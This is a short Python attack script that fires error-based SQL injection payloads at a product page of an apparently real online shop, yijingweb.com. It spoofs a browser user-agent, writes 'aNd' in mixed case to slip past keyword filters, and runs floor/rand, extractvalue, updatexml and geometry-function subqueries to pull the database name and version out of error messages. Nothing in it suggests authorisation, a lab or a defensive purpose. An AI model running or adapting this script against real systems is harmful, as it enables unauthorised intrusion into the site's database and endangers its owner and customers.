#!/usr/bin/env python3
"""yijingweb: try error-based via aNd (mixed case) + subquery - single request each"""
import urllib.request, urllib.parse, re, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "zh-CN,zh;q=0.9", "Accept-Encoding": "identity"}
BASE = "http://www.yijingweb.com/webmall/detail.php"

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(6000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def probe(expr, tag):
    payload = "%27%20aNd%20(" + urllib.parse.quote(expr) + ")--%20"
    code, body = fetch(BASE + "?id=686" + payload)
    # error markers
    err = re.findall(r'(MySQL Error|Invalid SQL|Duplicate entry|floor\(|XPATH|syntax error)', body, re.I)
    print("%-22s code=%s size=%d %s" % (tag, code, len(body), err[:2]), flush=True)
    time.sleep(3)

# error-based vectors (avoid blocked keywords via case/encoding)
probe("select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a", "floor-db")
probe("select 1 from (select count(*),concat((select version()),floor(rand(0)*2))x from information_schema.tables group by x)a", "floor-ver")
probe("select extractvalue(1,concat(0x7e,version()))", "extractvalue")
probe("select updatexml(1,concat(0x7e,version()),1)", "updatexml")
probe("select ST_LatFromGeoHash(concat(0x7e,version()))", "ST-geohash")
probe("select geometrycollection(concat(0x7e,version()))", "geometry")
